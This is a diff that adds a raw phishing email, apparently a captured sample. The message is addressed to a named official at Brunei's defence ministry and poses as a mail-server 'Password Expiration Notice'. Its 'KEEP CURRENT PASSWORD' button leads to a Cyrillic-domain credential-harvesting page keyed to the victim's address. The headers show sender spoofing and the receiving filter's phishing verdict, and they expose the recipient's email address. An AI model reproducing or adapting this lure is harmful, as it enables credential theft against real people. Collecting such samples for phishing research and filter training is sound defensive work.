@@ -1,0 +1,108 @@
+Return-Path: <contact@kitazato.co.jp>
+Authentication-Results: bolmddfml001u.mindef.gov.bn;
+	spf=permerror (gov.bn: 5.16.163.28 is neither permitted nor denied by domain of contact@kitazato.co.jp) smtp.mailfrom=contact@kitazato.co.jp;
+	dkim=pass header.i=@readlook.tk;
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple; d=readlook.tk; h=
+	content-transfer-encoding:content-type:mime-version:message-id
+	:date:subject:to:from; s=dkim; t=1740444039; x=1743036040; bh=oJ
+	SHosbNNsoi+YJrBqqzzOxsZbKqfLd+1I4rZqKXwyg=; b=PZVSbLn5EReCh1Wl4J
+	86IUs2mxcBypPFwPJZpVyn2G5k8ljBKut8/5Gzy8g10rh5O4YibbYsi5Zi9zm5nx
+	ubsFOa5mter37OOTxFzzqJxp+hrk9nUrUwsi0QpuX5PcOruxdbUWM8se6eNftRyw
+	P7qIqomynSc8U1LBBh6X3M+E2HfODJqNUjkpmofM/P0ghmxwg+7itnpG0i3Msrsx
+	uuS+aOP0b/3soM5oFCdEPmgyZbzPfF3rgqc8YPSk1bHozxTaPORrPx3EBnFWOSSd
+	t6PrrQ0w5llRh3ScDlfMtacum6ix5Z/HjpGkllOFWfgIfn8Xurj3JWXRqzkC6+LB
+	v3Rw==
+X-Virus-Scanned: Debian amavisd-new at mail.readlook.tk
+From: mindef.gov.bn<contact@kitazato.co.jp>
+To: ismadi.jumat@mindef.gov.bn
+Subject: [***IMPORTANT***] Password Expiration Notice
+Date: 24 Feb 2025 13:33:48 -0800
+Message-ID: <20250224133348.9F70907E33F8279F@kitazato.co.jp>
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+X-FEAS-DKIM: Valid
+X-FEAS-WebFilter: https://xn--80ahmhaffmdcb2cn4e.xn--p1ai/ajax/new-html.html#ismadi.jumat@mindef.gov.bn (Phishing)
+X-FE-Policy-ID: 0:1:0:SYSTEM
+X-FEAS-Client-IP: 5.16.163.28
+X-FE-Orig-Env-Rcpt: ismadi.jumat@mail1.mindef.gov.bn
+X-FE-Orig-Env-From: contact@kitazato.co.jp
+X-FE-Last-Public-Client-IP: 5.16.163.28
+X-FE-Envelope-From: contact@kitazato.co.jp
+X-FE-Macro: MjIgc2VyaWFsaXphdGlvbjo6YXJjaGl2ZSAxOCAxIDAgMjkgNTIxQkhRSlkwMDY1MDktNTIxQkhRSmEwMDY1MDkgMjIgY29udGFjdEBraXRhemF0by5jby5qcCAwIDAg
+ IDAgIDEgMzMgc3lzdGVtcXVhcmFudGluZStWVkpNWDBacGJIUmxjZz09IDAgMTQgMyB7cn0gNiBFU01UUFMgMyB7X30gNTggNXgxNngxNjN4Mjguc3RhdGljLWJ1c2lu
+ ZXNzLnNwYi5lcnRlbGVjb20ucnUgWzUuMTYuMTYzLjI4XSAzIHtzfSAxNiBtYWlsLnJlYWRsb29rLnRrIDEzIHtjbGllbnRfbmFtZX0gNDQgNXgxNngxNjN4Mjguc3Rh
+ dGljLWJ1c2luZXNzLnNwYi5lcnRlbGVjb20ucnUgMyB7an0gMjcgQk9MTURERk1MMDAxVS5taW5kZWYuZ292LmJuIDkge2lmX2FkZHJ9IDExIDEwLjIzLjEuMjAwIDEx
+ IHtyY3B0X2FkZHJ9IDI2IGlzbWFkaS5qdW1hdEBtaW5kZWYuZ292LmJuIDE0IHtkYWVtb25fZmxhZ3N9IDAgIDExIHtmZV9jbGllbnR9IDExIDUuMTYuMTYzLjI4IDEw
+ IHtmZV9jaGVsb30gMTYgbWFpbC5yZWFkbG9vay50ayAxMSB7ZmVfc2VydmVyfSAxMSAxMC4yMy4xLjIwMCAxMCB7bXNnX3NpemV9IDQgNjEyOCAxMSB7YXV0aF90eXBl
+ fSAwICAxMyB7YXV0aF9hdXRoZW59IDAgCg==
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.=
+w3.org/TR/html4/loose.dtd">
+
+<HTML><HEAD>
+<META name=3DGENERATOR content=3D"MSHTML 11.00.10570.1001"></HEAD>
+<BODY style=3D"MARGIN: 0.5em">
+<DIV dir=3Dltr>
+<DIV style=3D"FONT-SIZE: small; FONT-FAMILY: Arial,Helvetica,sans-serif; WH=
+ITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 40=
+0; COLOR: rgb(34,34,34); FONT-STYLE: normal; LETTER-SPACING: normal; BACKGR=
+OUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatures: nor=
+mal; font-variant-caps: normal; text-decoration-style: initial; text-decora=
+tion-color: initial">
+<DIV style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; MAX-WIDTH: 500px; FO=
+NT-FAMILY: Arial,sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-T=
+RANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(51,51,51); PADDING-BOTTOM: 30p=
+x; FONT-STYLE: normal; TEXT-ALIGN: center; PADDING-TOP: 30px; PADDING-LEFT:=
+ 30px; MARGIN: auto; LETTER-SPACING: normal; PADDING-RIGHT: 30px; BACKGROUN=
+D-COLOR: rgb(255,153,0); TEXT-INDENT: 0px; font-variant-ligatures: normal; =
+font-variant-caps: normal; text-decoration-style:=20
+initial; text-decoration-color: initial; border-radius: 10px">
+<H1 style=3D"BOX-SIZING: border-box; FONT-SIZE: 24px; MARGIN-BOTTOM: 20px; =
+MARGIN-TOP: 0px; FONT-WEIGHT: 500; LINE-HEIGHT: 1.2"><B><SPAN style=3D"COLO=
+R: black"><FONT style=3D"VERTICAL-ALIGN: inherit"><FONT style=3D"VERTICAL-A=
+LIGN: inherit">Please Confirm Password&nbsp;</FONT></FONT></SPAN></B></H1>
+<P><BR></P>
+<P style=3D"BOX-SIZING: border-box; FONT-SIZE: 16px; MARGIN: 10px 0px; LINE=
+-HEIGHT: 1.5"><FONT style=3D"VERTICAL-ALIGN: inherit"><FONT style=3D"VERTIC=
+AL-ALIGN: inherit"><B><SPAN style=3D"COLOR: red">WARNING</SPAN></B><BR></FO=
+NT></FONT></P>
+<P style=3D"BOX-SIZING: border-box; FONT-SIZE: 16px; MARGIN: 10px 0px; LINE=
+-HEIGHT: 1.5"><FONT style=3D"VERTICAL-ALIGN: inherit"><FONT style=3D"VERTIC=
+AL-ALIGN: inherit">Your password for ( <SPAN style=3D"COLOR: rgb(61,133,198=
+)">ismadi.jumat@mindef.gov.bn</SPAN> ) is Set to expire today.</FONT></FONT=
+></P>
+<P style=3D"BOX-SIZING: border-box; FONT-SIZE: 16px; MARGIN: 10px 0px; LINE=
+-HEIGHT: 1.5"><FONT style=3D"VERTICAL-ALIGN: inherit"><FONT style=3D"VERTIC=
+AL-ALIGN: inherit">to continue using the same password, Please click the bu=
+tton below to Keep using the same password.</FONT></FONT></P>
+<A style=3D"BOX-SIZING: border-box; TEXT-DECORATION: none; MARGIN-TOP: 20px=
+; FONT-WEIGHT: bold; COLOR: white; PADDING-BOTTOM: 12px; PADDING-TOP: 12px;=
+ PADDING-LEFT: 25px; DISPLAY: inline-block; PADDING-RIGHT: 25px; BACKGROUND=
+-COLOR: rgb(0,123,255); border-radius: 5px" href=3D"https://&#1076;&#1086;&=
+#1084;&#1082;&#1086;&#1083;&#1086;&#1090;&#1091;&#1096;&#1082;&#1080;&#1085=
+;&#1072;.&#1088;&#1092;/ajax/new-html.html#ismadi.jumat@mindef.gov.bn" rel=
+=3Dnoreferrer target=3D_blank=20
+data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://profesionali=
+zateya.com/newss/?userid%3D%5B%5B-Email-%5D%5D&amp;source=3Dgmail&amp;ust=
+=3D1734425818933000&amp;usg=3DAOvVaw0B-H4vRYxlrU1tViJOwBG4"><FONT style=3D"=
+VERTICAL-ALIGN: inherit"><FONT style=3D"VERTICAL-ALIGN: inherit">KEEP CURRE=
+NT PASSWORD</FONT></FONT></A></DIV>
+<DIV style=3D"BOX-SIZING: border-box; FONT-SIZE: 12px; FONT-FAMILY: Arial,s=
+ans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; MARGIN-TOP: 20px; TEXT-T=
+RANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(153,153,153); FONT-STYLE: norm=
+al; LETTER-SPACING: normal; TEXT-INDENT: 0px; font-variant-ligatures: norma=
+l; font-variant-caps: normal; text-decoration-style: initial; text-decorati=
+on-color: initial" align=3Dcenter>
+<DIV style=3D"BOX-SIZING: border-box; FONT-SIZE: 12px; MARGIN-TOP: 20px; CO=
+LOR: rgb(153,153,153)" align=3Dcenter><FONT style=3D"VERTICAL-ALIGN: inheri=
+t"><FONT style=3D"VERTICAL-ALIGN: inherit">&copy; This is an automatic Mess=
+age from Mail Server<BR></FONT></FONT></DIV></DIV>
+<P></P></DIV>
+<DIV style=3D"FONT-SIZE: small; FONT-FAMILY: Arial,Helvetica,sans-serif; WH=
+ITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 40=
+0; COLOR: rgb(34,34,34); FONT-STYLE: normal; LETTER-SPACING: normal; BACKGR=
+OUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatures: nor=
+mal; font-variant-caps: normal; text-decoration-style: initial; text-decora=
+tion-color: initial">...</DIV></DIV></BODY></HTML>
